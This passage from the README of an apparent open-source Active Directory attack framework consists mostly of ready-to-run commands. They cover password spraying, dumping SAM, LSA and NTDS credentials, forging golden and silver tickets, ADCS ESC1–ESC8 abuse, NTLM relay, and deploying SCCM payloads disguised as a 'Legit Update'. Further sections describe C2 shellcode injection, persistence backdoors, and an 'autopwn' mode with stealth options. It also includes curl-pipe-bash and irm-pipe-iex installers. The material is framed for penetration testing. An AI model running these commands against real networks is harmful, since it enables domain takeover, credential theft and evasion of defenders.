ovt spray -H 10.10.10.1 -d corp.local --password 'Winter2026!' --userlist users.txt --delay 2 --jitter 1
```
Detects lockouts, aborts on repeated `KDC_ERR_CLIENT_REVOKED`. Use `--delay` to not get your creds locked out.

---

### dump - credential dumping (remote, needs admin)

```bash
ovt dump --target 10.10.10.50 sam  -d corp.local -u admin -p 'Pass!'
ovt dump --target 10.10.10.50 lsa  -d corp.local -u admin -p 'Pass!'
ovt dump --target 10.10.10.1  ntds -d corp.local -u da_admin -p 'DA_Pass!'
ovt dump --target 10.10.10.50 dcc2 -d corp.local -u admin -p 'Pass!'
```

---

### forge - ticket forging

```bash
ovt forge golden \
  --domain-sid S-1-5-21-1234-5678-9012-498 \
  --krbtgt-hash <32hex> \
  --user Administrator --rid 500 \
  --output golden.kirbi

ovt forge silver \
  --domain-sid S-1-5-21-1234-5678-9012-498 \
  --service-hash <32hex> \
  --spn cifs/dc01.corp.local \
  --output silver.kirbi
```

---

### adcs - certificate abuse ESC1-ESC8

```bash
ovt adcs enum -H 10.10.10.1 -d corp.local -u jsmith -p 'Pass!'
ovt adcs enum --ca CA01.corp.local
ovt adcs esc1 --ca CA01 --template VulnTemplate --target-user Administrator
ovt adcs esc2 --ca CA01 --template AnyPurpose
ovt adcs esc3 --ca CA01 --agent-template Agent --target-template User --target-user admin
ovt adcs esc4 --ca CA01 --template WritableTemplate
ovt adcs esc5 --ca CA01
ovt adcs esc6 --ca CA01 --target-user Administrator
ovt adcs esc7 --ca CA01
ovt adcs esc8 --url https://ca01.corp.local/certsrv --target-user Administrator
ovt adcs request --ca CA01 --template User --san "administrator@corp.local" -o cert.pfx
```
Alias: `certify`

---

### ntlm - NTLM relay and poisoning

```bash
ovt ntlm capture --interface eth0 --port 445
ovt ntlm relay --targets 10.10.10.50:445,10.10.10.51:445
ovt ntlm relay --targets 10.10.10.50:445 --command "whoami"
ovt ntlm smb-relay --targets 10.10.10.50:445 --command "whoami"
ovt ntlm http-relay --targets 10.10.10.1:80
```
Alias: `relay`

---

### secrets - offline secrets from registry hives

```bash
ovt secrets sam  --sam ./SAM      --system ./SYSTEM
ovt secrets lsa  --security ./SECURITY --system ./SYSTEM
ovt secrets dcc2 --security ./SECURITY --system ./SYSTEM
```
For when you've already grabbed the hive files and want to parse offline.

---

### gpp - decrypt GPP cpasswords

```bash
ovt gpp --file Groups.xml
ovt gpp --cpassword "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+..."
```
Microsoft literally published the AES key in their docs. We just use it.

---

### laps - read LAPS passwords

```bash
ovt laps -H 10.10.10.1 -d corp.local -u jsmith -p 'Pass!'
ovt laps --computer WS01 -H 10.10.10.1 -d corp.local -u jsmith -p 'Pass!'
```
Reads both LAPS v1 (plaintext) and LAPS v2 (DPAPI encrypted).

---

### rid - RID cycling enumeration

```bash
ovt rid -H 10.10.10.1 -d corp.local -u jsmith -p 'Pass!'
ovt rid -H 10.10.10.1 -d corp.local --start-rid 500 --end-rid 50000
ovt rid -H 10.10.10.1 -d corp.local --null-session    # no creds needed
```
Alias: `rid-cycle`, `rid-brute`

---

### scan - port scanner

```bash
ovt scan --targets 10.10.10.0/24
ovt scan --targets 10.10.10.1 --ports 1-65535
ovt scan --targets 10.10.10.0/24 --ports 80,443,445,3389,5985 --timeout 2000
ovt scan --targets 10.10.10.0/24 --scan-type syn     # needs root/raw sockets
```
Alias: `scan`, `portscan`

---

### mssql - SQL Server operations

```bash
ovt mssql query          --target 10.10.10.100 --query "SELECT @@version" -d corp.local -u sa -p 'sa'
ovt mssql xp-cmd-shell   --target 10.10.10.100 --command "whoami"
ovt mssql linked-servers --target 10.10.10.100
ovt mssql enable-xp-cmd-shell  --target 10.10.10.100
ovt mssql check-xp-cmd-shell   --target 10.10.10.100
```
Alias: `mssql`, `sql`

---

### move - trust mapping and lateral paths

```bash
ovt move trusts     -H 10.10.10.1 -d corp.local -u jsmith -p 'Pass!'
ovt move escalation
ovt move mssql
ovt move map
```
Alias: `lateral`

---

### sccm - SCCM/MECM abuse

```bash
ovt sccm enum  --site-server sccm01.corp.local
ovt sccm abuse --site-server sccm01.corp.local --technique client-push
ovt sccm deploy --collection "All Systems" --app-name "Legit Update" --payload ./payload.exe
```
Aliases: `sccm`, `mecm`

---

### c2 - C2 framework integration

```bash
ovt c2 connect sliver 10.10.10.200 31337 --config ./operator.cfg
ovt c2 connect cs     10.10.10.200 50050 --password 'teamserver_pass'
ovt c2 connect havoc  10.10.10.200 40056 --token 'api_token_here'
ovt c2 status
ovt c2 exec <session_id> "whoami /all"
ovt c2 exec <session_id> "Get-Process" --powershell
ovt c2 deploy default 10.10.10.50 http-listener
ovt c2 listeners default
ovt c2 disconnect all
```

---

### plugin - plugin system

```bash
ovt plugin list
ovt plugin info smart-spray
ovt plugin exec spray-smart -- --targets users.txt --password 'Winter2026!'
ovt plugin load ./plugins/custom_scanner.wasm
ovt plugin unload custom-scanner
ovt plugin enable custom-scanner
ovt plugin disable custom-scanner
```
Alias: `plug`

---

### report - generate engagement report

```bash
ovt report --input engagement.json --output report.md    --format markdown
ovt report --input engagement.json --output findings.json --format json
ovt report --input engagement.json --output exec.pdf     --format pdf
```

---

### doctor - pre-engagement checks

```bash
ovt doctor
ovt doctor --checks smb,kerberos,winrm,network --dc 10.10.10.1
```
Aliases: `check`, `env`

---

### tui - interactive terminal UI

```bash
ovt tui --domain corp.local -H 10.10.10.1 -d corp.local -u jsmith -p 'Pass!'
ovt tui --domain corp.local --load graph.json --crawl false
```
Alias: `ui`

---

### Quick cheat sheet

```bash
# RECON
ovt enum all        -H DC -d DOMAIN -u USER -p PASS
ovt reaper          -H DC -d DOMAIN -u USER -p PASS --dc-ip DC
ovt scan --targets 10.10.10.0/24 --ports 445,88,389,3389,5985
ovt rid -H DC -d DOMAIN --null-session

# KERBEROS
ovt kerberos roast        -H DC -d DOMAIN -u USER -p PASS
ovt kerberos asrep-roast  -H DC -d DOMAIN -u USER -p PASS
ovt kerberos get-tgt      -H DC -d DOMAIN -u USER -p PASS
ovt crack --file ./loot/kerberoast_hashes.txt --mode thorough

# CERTS
ovt adcs enum -H DC -d DOMAIN -u USER -p PASS
ovt adcs esc1 --ca CA --template TPL --target-user DA

# LATERAL
ovt exec   --target TARGET --command "whoami" -d DOMAIN -u USER -p PASS
ovt exec   --target TARGET --command "whoami" -d DOMAIN -u USER --nt-hash HASH
ovt shell  --target TARGET -d DOMAIN -u USER -p PASS
ovt smb admin --targets 10.10.10.0/24 -d DOMAIN -u USER -p PASS

# LOOT
ovt dump   --target DC ntds -d DOMAIN -u DA -p PASS
ovt forge golden --domain-sid SID --krbtgt-hash HASH --output golden.kirbi
ovt laps   -H DC -d DOMAIN -u USER -p PASS

# AUTOPWN
ovt auto-pwn -H DC -d DOMAIN -u USER -p PASS
ovt wizard   --target "Domain Admins" --dc-host DC -d DOMAIN -u USER

# MISC
ovt doctor
ovt report --output report.pdf --format pdf
ovt tui --domain DOMAIN
```

---

## Features

### Enumeration (overthrone-reaper)

The "ask nicely and receive everything" phase. Active Directory is the most oversharing protocol since your aunt discovered Facebook.

| Feature | What it finds | Status |
|---|---|---|
| **Full LDAP enumeration** | Every user, computer, group, OU, and GPO in the domain. AD is surprisingly chatty with authenticated users. It's like a bartender who tells you everyone's secrets after one drink. | ✅ Done |
| **Kerberoastable accounts** | Service accounts with SPNs. These are the ones with passwords that haven't been changed since someone thought "qwerty123" was secure. | ✅ Done |
| **AS-REP roastable accounts** | Accounts that don't require pre-authentication. Someone literally unchecked a security checkbox. On purpose. In production. | ✅ Done |
| **Domain trusts** | Parent/child, cross-forest, bidirectional. The map of "who trusts whom" and more importantly, "who shouldn't." | ✅ Done |
| **ACL analysis** | GenericAll, WriteDACL, WriteOwner - the holy trinity of "this service account can do WHAT?" | ✅ Done |
| **Delegation discovery** | Unconstrained, constrained, resource-based. Delegation is AD's way of saying "I trust this computer to impersonate anyone." | ✅ Done |
| **Password policy** | Lockout thresholds, complexity requirements, history. Know the rules before you break them. | ✅ Done |
| **LAPS discovery** | LAPS v1 (plaintext ms-Mcs-AdmPwd) and LAPS v2 - including the encrypted variant (msLAPS-EncryptedPassword) via DPAPI/AES-256-GCM decryption. The DPAPI module finally exists. Hallelujah. | ✅ Full (v1 + v2 encrypted) |
| **GPP Passwords** | Fetches GPP XML from SYSVOL over SMB, decrypts cpassword values. Microsoft published the AES key. In their documentation. On purpose. | ✅ Done |
| **MSSQL Enumeration** | MSSQL instances, linked servers, xp_cmdshell. SQL Server: because every network needs a database with `sa:sa` credentials. | ✅ Full TDS client |
| **ADCS Enumeration** | Certificate templates, enrollment services, CA permissions, vulnerable template identification. ADCS is the gift that keeps on giving (to attackers). | ✅ Done |
| **BloodHound Export** | Export users, groups, computers, domains to BloodHound-compatible JSON. CSV and graph export too. | ✅ Done |

### Attack Execution (overthrone-hunter)

The crate with zero stubs. The only crate that did all its homework. If overthrone-hunter were a student, it would remind the teacher about the assignment.

| Attack | How it works | Status |
|---|---|---|
| **Kerberoasting** | Request TGS tickets for SPN accounts, crack offline with embedded wordlist or hashcat. The DC hands you encrypted tickets and says "good luck cracking these" and hashcat says "lol." | ✅ Full |
| **AS-REP Roasting** | Request AS-REP for accounts without pre-auth. Someone unchecked "Do not require Kerberos preauthentication." That single checkbox has caused more breaches than we can count. | ✅ Full |
| **Auth Coercion** | PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce - force machines to authenticate to you. The DC does this willingly. Microsoft considers this "working as intended." | ✅ Full (5 techniques) |
| **RBCD Abuse** | Create machine account + modify msDS-AllowedToActOnBehalfOfOtherIdentity + S4U2Self/S4U2Proxy chain. The attack with the longest name and the shortest time-to-DA. | ✅ Full |
| **Constrained Delegation** | S4U2Self + S4U2Proxy to impersonate users to specific services. Microsoft: "You can only impersonate to these services." Attackers: "What about these other services?" | ✅ Full |
| **Unconstrained Delegation** | Steal TGTs from anyone who authenticates to a compromised machine. It's always the print server. Always. | ✅ Full |
| **Inline Hash Cracking** | Embedded top-10K wordlist (zstd compressed), rayon parallel cracking, rule engine (leet, append year/digits, capitalize), hashcat subprocess fallback. | ✅ Full |
| **Ticket Manipulation** | Request, cache, convert between .kirbi and .ccache formats. Tickets are the currency of AD. This module is the money printer. | ✅ Full |

### Attack Graph (overthrone-core)

BloodHound rebuilt in Rust without the Neo4j dependency. Maps every relationship in the domain and finds the shortest path to making the blue team update their resumes.

| Feature | Details | Status |
|---|---|---|
| **Directed graph** | Nodes (users, computers, groups, domains) and edges (MemberOf, AdminTo, HasSession, GenericAll, etc.) - LinkedIn for attack paths. | ✅ Full (petgraph) |
| **Shortest path** | Dijkstra with weighted edges - `MemberOf` is free, `AdminTo` costs 1, `HasSpn` costs 5 (offline cracking). Finds the path of least resistance. Just like a real attacker. Just like water. | ✅ Full |
| **Path to DA** | Finds every shortest path from a compromised user to Domain Admins. Usually shorter than you'd expect. Usually terrifyingly short. | ✅ Full |
| **High-value targets** | Auto-identifies Domain Admins, Enterprise Admins, Schema Admins, KRBTGT, DC computer accounts. The "if you compromise these, the game is over" list. | ✅ Full |
| **Kerberoast reachability** | "From user X, which Kerberoastable accounts can I reach, and how?" - it's a shopping list for your GPU. | ✅ Full |
| **Delegation reachability** | "From user X, which unconstrained delegation machines are reachable?" (Spoiler: it's the print server.) | ✅ Full |
| **JSON export** | Full graph export for D3.js, Cytoscape, or your visualization tool of choice. Clients love graphs that look like conspiracy boards. | ✅ Full |
| **Degree centrality** | Find the nodes with the most connections. Either Domain Admins or the intern's test account that somehow has GenericAll on everything. | ✅ Full |

### NTLM Relay & Poisoning (overthrone-relay)

Born complete. Zero stubs. The prodigy crate that showed up on day one and said "I'm not here to play, I'm here to win."

| Feature | Details | Status |
|---|---|---|
| **NTLM Relay Engine** | Full relay - capture NTLM auth from one protocol, replay to another. SMB → LDAP, HTTP → SMB, mix and match like a deadly cocktail. | ✅ Full |
| **LLMNR/NBT-NS/mDNS Poisoner** | Respond to broadcast name resolution. "Who is FILESERVER?" "Me. I'm FILESERVER now." Identity theft, but for computers. | ✅ Full |
| **Network Poisoner** | Decides when to poison, what to poison, and how aggressively - while avoiding detection. Subtlety is an art form. | ✅ Full |
| **ADCS Relay (ESC8)** | Relay NTLM auth to AD Certificate Services web enrollment. Get a certificate as the victim. Certificates: the new hashes. | ✅ Full |

### Persistence (overthrone-forge)

Taking the throne is easy. Keeping it is an art form. This crate welds the crown to your head.

| Technique | What it does | Status |
|---|---|---|
| **DCSync** | Replicate credentials from the DC using MS-DRSR. Get every hash in the domain. The CEO's. The intern's. The service account from 2009 nobody remembers creating. | ✅ Full |
| **Golden Ticket** | Forge a TGT signed with the KRBTGT hash. Be any user. Access anything. The Willy Wonka golden ticket, except the factory is Active Directory. | ✅ Full (with PAC construction) |
| **Silver Ticket** | Forge a TGS for a specific service. Stealthier than Golden - no DC interaction needed. | ✅ Full |
| **Diamond Ticket** | Modify a legit TGT's PAC. Bypasses detections that check for TGTs not issued by the KDC. The stealth bomber of ticket forging. | ✅ Full |
| **Shadow Credentials** | Add a key credential to msDS-KeyCredentialLink via LDAP, then authenticate with PKINIT (real RSA signing + DH key exchange). The cool modern attack, and it actually works now. | ✅ Full (LDAP + PKINIT) |
| **ACL Backdoor** | Modify DACLs to grant yourself hidden permissions. The "I was always an admin, you just didn't notice" technique. | ✅ Full |
| **Skeleton Key** | Patch LSASS to accept a master password. Full orchestration: SMB connect → admin check → upload → SVCCTL exec → cleanup. Needs a C2 session on the DC. | ✅ Full (orchestration) |
| **DSRM Backdoor** | Set DsrmAdminLogonBehavior=2 via remote registry. Persistent backdoor via DSRM Administrator. | ✅ Full |
| **Forensic Cleanup** | Rollback every persistence technique. Because good pentesters clean up. Great pentesters never needed to. | ✅ Full |
| **Validation** | Verify persistence actually works post-deployment. Trust but verify. (Actually, just verify. This is offensive security.) | ✅ Full |

### ADCS Exploitation (overthrone-core)

AD Certificate Services: where Microsoft said "let's add PKI to Active Directory" and attackers said "thank you for your service."

| ESC | Attack | Status | Notes |
|---|---|---|---|
| **ESC1** | Enrollee supplies subject / SAN in request | ✅ Implemented | Full `Esc1Exploiter` - SAN UPN abuse, CSR generation, certificate enrollment, NT hash extraction from PKCS#12. 204 lines. The main character has arrived. |
| **ESC2** | Any purpose EKU + enrollee supplies subject | ✅ Implemented | Any Purpose certificates exploited via enrollment request manipulation. The "I can be anything" certificate. |
| **ESC3** | Enrollment agent + second template abuse | ✅ Implemented | Two-step: get enrollment agent cert, then request cert as victim. The buddy system of exploitation. |
| **ESC4** | Vulnerable template ACLs → modify to ESC1 | ✅ Implemented | Modify template permissions, then exploit. If you can write the rules, you can break the rules. |
| **ESC5** | Vulnerable PKI object permissions | ✅ Implemented | Abuse permissions on PKI infrastructure objects. |
| **ESC6** | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | ✅ Implemented | Full `Esc6Exploiter` - detects and exploits the EDITF flag on CAs. Its name is longer than the code, but the code works. |
| **ESC7** | CA access control abuse (ManageCA rights) | ✅ Implemented | CA permission manipulation. |
| **ESC8** | Web enrollment NTLM relay | ✅ Implemented | Full relay with the overthrone-relay crate integration. |

### Remote Execution (overthrone-core)

Six lateral movement methods. All implemented. The `todo!()` trio graduated.

| Method | Protocol | Status | Notes |
|---|---|---|---|
| **WinRM (Linux/macOS)** | WS-Management + NTLM | ✅ Full | Pure Rust WS-Man with NTLM auth. Create shell, execute, receive output, delete shell. Cross-platform perfection. |
| **WinRM (Windows)** | Win32 WSMan API | ✅ Full | Commands execute via native Win32 API with real output collection via `WSManReceiveShellOutput`. The mystery is solved. |
| **AtExec** | ATSVC over SMB | ✅ Full | Scheduled task creation via named pipe. "Task Scheduler is a feature, not a vulnerability." |
| **PsExec** | DCE/RPC + SMB | ✅ Full | Real DCE/RPC bind packet building, service creation, payload upload to ADMIN$, execution, cleanup. The sports car now has a steering wheel. |
| **SmbExec** | SCM over SMB | ✅ Full | Service-based command execution via SMB named pipes. Clean, simple, effective. |
| **WmiExec** | DCOM/WMI | ✅ Full | WMI-based semi-interactive command execution with output retrieval via SMB. |

### C2 Framework Integration (overthrone-core)

The C2 integration that went from "aspirational" to "actually works." Three backends, all with real HTTP clients, real auth flows, and real API calls.

| Framework | What It Does | Auth | Status |
|---|---|---|---|
| **Sliver** | Full C2Channel trait - sessions, beacons, exec, PowerShell, upload/download, assembly, BOF, shellcode inject, implant generation, listener management. Operator `.cfg` parsing with mTLS. | mTLS (certificate + CA from operator config) | ✅ Full |
| **Havoc** | Full C2Channel trait - Demon agent management, shell/PowerShell exec, upload/download, .NET assembly exec, BOF exec, shellcode inject, payload generation. Task polling with 5-min timeout. | Token or password auth (REST login endpoint) | ✅ Full |
| **Cobalt Strike** | Full C2Channel trait - beacon management, BOF execution, shellcode injection, payload generation. Aggressor-style REST API. | Bearer token or password auth | ✅ Full |

All three implement the complete `C2Channel` async trait: `connect`, `disconnect`, `list_sessions`, `get_session`, `exec_command`, `exec_powershell`, `upload_file`, `download_file`, `execute_assembly`, `execute_bof`, `shellcode_inject`, `deploy_implant`, `list_listeners`, `server_info`. The trait system is legitimately well-designed. The water is connected now.

### Crypto Layer (overthrone-core)

The layer that used to be the "Empty Files Hall of Shame." The shame has been resolved. The five one-line doc comments are now real implementations.

| Module | What It Does | Status |
|---|---|---|
| **AES-CTS** | AES256-CTS-HMAC-SHA1 for Kerberos etype 17/18. The thing that makes modern tickets work. | ✅ Full |
| **RC4** | RC4 encryption for Kerberos etype 23. The crypto equivalent of a screen door on a submarine, but AD still uses it everywhere. | ✅ Full |
| **HMAC** | HMAC utilities for ticket validation and integrity checking. | ✅ Full |
| **MD4** | MD4 hash for NTLM password hashing. The algorithm from 1990 that refuses to die, much like NTLM itself. | ✅ Full |
| **Ticket Crypto** | Ticket forging primitives - encryption, PAC signing, checksum computation. The mathematical foundation of ticket forging. | ✅ Full |
| **DPAPI** | LAPS v2 encrypted blob parsing, AES-256-GCM decryption, HMAC-SHA512 key derivation. With property-based tests using `proptest`. The module that doesn't exist? It exists now. | ✅ Full (with tests) |
| **GPP** | Group Policy Preferences cpassword AES decryption. Microsoft published the key. We just use it. | ✅ Full |
| **Cracker** | Offline hash cracking engine - embedded wordlist, rayon parallel processing, rule engine. | ✅ Full |

### Plugin System (overthrone-core)

| Component | Status | Notes |
|---|---|---|
| **Plugin Trait** | ✅ Full | Complete plugin API: manifest, capabilities, events, command execution. |
| **Native DLL Loading** | ✅ Full | `libloading`-based FFI with API version checking, manifest JSON parsing, function pointer caching. |
| **Built-in Example** | ✅ Full | SmartSpray plugin with lockout avoidance. A complete working example that actually spray-attacks responsibly. |
| **WASM Plugin Runtime** | ✅ Full | Wasmtime engine, module compilation, host function linking (`env.log`, `env.graph_add_node`, `env.graph_add_edge`). Plugins load, execute, and maintain state between calls. Manifest custom section parsing works. Memory allocation tries plugin's `allocate()` first. The engine is tuned and road-ready. |

### Autonomous Planning (overthrone-pilot)

The "I'll hack it myself" engine. Now with machine learning.

| Feature | Status |
|---|---|
| **Attack Planner** | ✅ Plans multi-step attack chains from enumeration data |
| **Step Executor** | ✅ Executes each planned step by calling Hunter/Forge/Reaper. 90KB of execution logic. |
| **Adaptive Strategy** | ✅ Adjusts plan on-the-fly based on what succeeds and fails |
| **Q-Learning AI** | ✅ Reinforcement learning engine (compiled by default) - ε-greedy policy with decay (0.3→0.05), learns optimal attack sequences across engagements via state-action reward tables. Shows state, decision, Q-value, and reward at every step. |
| **Goal System** | ✅ Target DA, Enterprise Admin, specific user, specific host |
| **Playbooks** | ✅ Pre-built YAML attack sequences for common scenarios |
| **Wizard Mode** | ✅ Interactive guided mode for manual control with autopilot assist |
| **AutoPwn Runner** | ✅ Full engagement orchestrator: enum → graph → exploit → persist → report. Live kill-chain pipeline shows stage completion. Per-step output with noise level, priority, credential/host gains. 9-section final report: kill-chain visual, per-stage stats, goal status, credential table, admin hosts, loot summary, Q-learner session stats, adaptive summary, audit trail. |

### Reporting (overthrone-scribe)

The difference between a penetration test and a crime is paperwork. This crate does the paperwork.

| Format | Status | Notes |
|---|---|---|
| **Markdown** | ✅ Works | Technical report with findings, attack paths, and mitigations. For the team that has to fix things. |
| **JSON** | ✅ Works | Machine-readable for integration with SIEMs, ticketing systems, or your "how screwed are we" dashboard. |
| **PDF** | ✅ Works | Executive summary for people who think "Domain Admin" is a job title. Custom PDF renderer. |

Every report includes: findings with severity, full attack paths with hop-by-hop details, affected assets, MITRE ATT&CK mappings, remediation steps, mitigation recommendations, and attack narrative prose. Because "GenericAll on the Domain Object via nested group membership through a misconfigured ACE" means nothing to a CISO. "Anyone in marketing can become Domain Admin in 3 steps" does.

## Edge Types & Cost Model

The attack graph uses weighted edges. Lower cost = easier to exploit. The pathfinder minimizes total cost - finding the path of least resistance. Just like a real attacker. Just like electricity. Just like that one coworker who always finds the shortcut.

| Edge Type | Cost | Meaning |
|---|---|---|
| `MemberOf` | 0 | Group membership - free traversal, you already have it |
| `HasSidHistory` | 0 | SID History - legacy identity, free impersonation |
| `Contains` | 0 | OU/GPO containment - structural relationship |
| `AdminTo` | 1 | Local admin - direct compromise |
| `DcSync` | 1 | Replication rights - game over |
| `GenericAll` | 1 | Full control - you are God (of this specific object) |
| `ForceChangePassword` | 1 | Reset their password - aggressive but effective |
| `Owns` | 1 | Object owner - can grant yourself anything |
| `WriteDacl` | 1 | Modify permissions - give yourself GenericAll |
| `WriteOwner` | 1 | Change owner - give yourself Owns |
| `AllowedToDelegate` | 1 | Constrained delegation - impersonate to target service |
| `AllowedToAct` | 1 | RBCD - sneakier delegation abuse |
| `HasSession` | 2 | Active session - credential theft opportunity |
| `GenericWrite` | 2 | Write attributes - targeted property abuse |
| `AddMembers` | 2 | Add to group - escalate via group membership |
| `ReadLapsPassword` | 2 | Read LAPS - plaintext local admin password |
| `ReadGmsaPassword` | 2 | Read gMSA - service account password blob |
| `CanRDP` | 3 | RDP access - interactive logon |
| `CanPSRemote` | 3 | PS Remoting - command execution |
| `ExecuteDCOM` | 3 | DCOM execution - Excel goes brrr |
| `SQLAdmin` | 3 | SQL Server admin - `xp_cmdshell` is a "feature" |
| `TrustedBy` | 4 | Domain trust - cross-domain, requires more setup |
| `HasSpn` | 5 | Kerberoastable - offline cracking required |
| `DontReqPreauth` | 5 | AS-REP roastable - offline cracking required |
| `Custom(*)` | 10 | Unknown/custom - high cost, manual analysis needed |

## Protocol Stack

What Overthrone speaks fluently. All implemented in pure Rust:

| Protocol | Used for |
|---|---|
| **LDAP/LDAPS** | Domain enumeration, user/group/GPO/trust queries, ACL reading. AD's diary. |
| **Kerberos** | Authentication, TGT/TGS requests, ticket forging, roasting, PKINIT. The three-headed dog of authentication. |
| **SMB 2/3** | File operations, share enumeration, lateral movement, PtH. The universal remote of Windows networking. |
| **NTLM** | NT hash computation, NTLMv2 challenge-response, Pass-the-Hash. The protocol that refuses to die. |
| **MS-DRSR** | DCSync - replicating credentials via DRS RPC. Politely asking the DC for all credentials. |
| **MS-SAMR/RID** | SAM Remote - RID cycling, SID brute-force enumeration |
| **MSSQL/TDS** | Full TDS protocol client, auth, query execution, linked server crawling |
| **Remote Registry** | Remote registry manipulation via DCE/RPC |
| **DNS** | SRV record lookups for DC discovery via hickory-resolver |
| **PKINIT** | Certificate-based Kerberos pre-auth with RSA signing and DH key exchange |

Everything is implemented in Rust. No shelling out to `impacket`, no calling `mimikatz.exe`, no loading .NET assemblies, no Wine, no prayers to the Python dependency gods. Pure Rust protocol implementations talking raw bytes over the wire.

## Installation

### One-line install (Linux/macOS)

```bash
curl -fsSL https://raw.githubusercontent.com/Karmanya03/Overthrone/main/install.sh | bash
```

Auto-detects your platform, grabs the right binary, installs both `overthrone` and `ovt` to your PATH. Easier than misconfiguring a GPO.

### One-line install (Windows PowerShell)

```powershell
irm https://raw.githubusercontent.com/Karmanya03/Overthrone/main/install.ps1 | iex
```

Same thing, but for people who attack Active Directory from inside Active Directory. We respect the audacity.

### Download a binary

Grab the latest from [**Releases**](https://github.com/Karmanya03/Overthrone/releases):

| Platform | Binary | Architecture |
|---|---|---|
| **Windows** | [`overthrone-windows-x86_64.exe`](https://github.com/Karmanya03/Overthrone/releases/download/v0.1.1/overthrone-windows-x86_64.exe) | x86_64 |
| **Linux** | [`overthrone-linux-x86_64`](https://github.com/Karmanya03/Overthrone/releases/download/v0.1.1/overthrone-linux-x86_64) | x86_64 (musl, static) |
| **macOS** | [`overthrone-macos-aarch64`](https://github.com/Karmanya03/Overthrone/releases/download/v0.1.1/overthrone-macos-aarch64) | Apple Silicon (M1/M2/M3/M4) |

**Quick manual install:**

```bash
# Linux x86_64
curl -L https://github.com/Karmanya03/Overthrone/releases/download/v0.1.1/overthrone-linux-x86_64 -o ovt && chmod +x ovt && sudo mv ovt /usr/local/bin/

# macOS Apple Silicon
curl -L https://github.com/Karmanya03/Overthrone/releases/download/v0.1.1/overthrone-macos-aarch64 -o ovt && chmod +x ovt && sudo mv ovt /usr/local/bin/

# Kali (you're probably already here)
curl -L https://github.com/Karmanya03/Overthrone/releases/download/v0.1.1/overthrone-linux-x86_64 -o ovt && chmod +x ovt && sudo mv ovt /usr/local/bin/ && sudo apt install -y smbclient
```

### Build from source

For the trust-no-one crowd (respect - you're pentesters, paranoia is a job requirement):

```bash
git clone https://github.com/Karmanya03/Overthrone.git
cd Overthrone
cargo build --release

# Binaries at:
#   target/release/overthrone
#   target/release/ovt
# Same binary, two names. Like Clark Kent and Superman but less handsome.
```

### Post-install: smbclient

Overthrone is pure Rust with one external dependency. One. We tried to make it zero but `smb-rs` v0.11 doesn't expose directory listing yet. We're not bitter about it. (We're a little bitter about it.)

```bash
# Debian/Ubuntu/Kali
sudo apt install smbclient

# Arch (btw)
sudo pacman -S samba

# Fedora/RHEL
sudo dnf install samba-client

# macOS
brew install samba

# Windows
# Already there. Windows ships with SMB. It's the one time Windows having
# everything pre-installed actually works in your favor.
```

### Platform Support

| Platform | Status | Notes |
|---|---|---|
| **Kali Linux** | Recommended | Everything pre-installed. `smbclient` already there. This is the way. |
| **Linux** | Full support | Primary dev platform. All features. `apt install smbclient` and go. |
| **Windows** | Full support | Yes, you can attack AD from a Windows box. The irony writes itself. |
| **macOS** | Full support | Kerberos and LDAP work natively. `brew install samba` for SMB. Tim Cook would not approve. |
| **WSL** | Full support | Best of both worlds - Windows target, Linux attacker, one machine. |

## Usage

### Quick Start - Autopwn

For when you want to go from "I have creds" to "I own the domain" in one command:

```bash
# Full form - let the AI handle it
overthrone autopwn --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'

# Shorthand - for every occasion
ovt autopwn --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'

# Stealth mode - when the SOC is awake
ovt autopwn --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!' --stealth --jitter-ms 3000

# Recon only - enumerate everything, touch nothing
ovt autopwn --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!' --max-stage enumerate

# Q-Learning AI with persistent brain (gets smarter every run)
ovt autopwn --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!' \
  --adaptive hybrid --q-table ./engagement_brain.json

# Run a canned playbook instead of goal-driven AI
ovt autopwn --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!' \
  --playbook full-auto-pwn

# Dry run - plan the attack without pulling the trigger
ovt autopwn --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!' --dry-run
```

That's it. Overthrone enumerates users, computers, groups, trusts, GPOs, and shares - builds the attack graph - finds the shortest path to DA - Kerberoasts, sprays, cracks hashes - escalates, moves laterally, DCSyncs, and generates a report. The Q-Learning engine (compiled by default in hybrid mode) remembers what worked and optimizes future runs. This time you can actually watch it work: every step announces itself with stage, noise level, and priority, then shows the result with credential/host gains. The Q-learner prints its state encoding, action decision, and reward after each step. The final report is a full breakdown - kill-chain completion visual, per-stage success/fail stats, credential table, admin host list, loot summary, Q-learner session stats, and audit trail. Go get coffee if you want, but you might actually enjoy watching this one.

### Manual Mode

```bash
# Step 1: Enumerate everything
ovt enum all -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Step 2: Build and query the attack graph
ovt graph build -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt graph path-to-da --from jsmith                      # all paths to DA
ovt graph path --from jsmith --to "Domain Admins"         # shortest path
ovt graph stats                                           # node/edge counts
ovt graph export --output graph.json                     # save it
ovt graph export --output bloodhound.json --bloodhound   # BloodHound format

# Step 3: Kerberoast + AS-REP
ovt kerberos roast -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt kerberos asrep-roast -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt crack --file ./loot/kerberoast_hashes.txt --mode thorough

# Step 4: Spray (respect the lockout policy)
ovt spray -H 10.10.10.1 -d corp.local --password 'Winter2026!' --userlist users.txt

# Step 5: Lateral movement
ovt exec --target 10.10.10.50 --command "whoami /all" -d corp.local -u admin -p 'Pass!'
ovt exec --target 10.10.10.50 --command "whoami /all" -d corp.local -u admin --nt-hash aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
ovt exec --target 10.10.10.50 --command "whoami /all" --method smbexec

# Step 6: Persist
ovt dump --target 10.10.10.1 ntds -d corp.local -u dadmin -p 'G0tcha!'
ovt forge golden --domain-sid S-1-5-21-... --krbtgt-hash <32hex> --output golden.kirbi
ovt forge silver --domain-sid S-1-5-21-... --service-hash <32hex> --spn cifs/dc01.corp.local --output silver.kirbi

# Step 7: Report
ovt report --format markdown --output engagement-report.md
ovt report --format json --output findings.json
ovt report --format pdf --output executive-summary.pdf
```

### Command Reference - The Full Arsenal

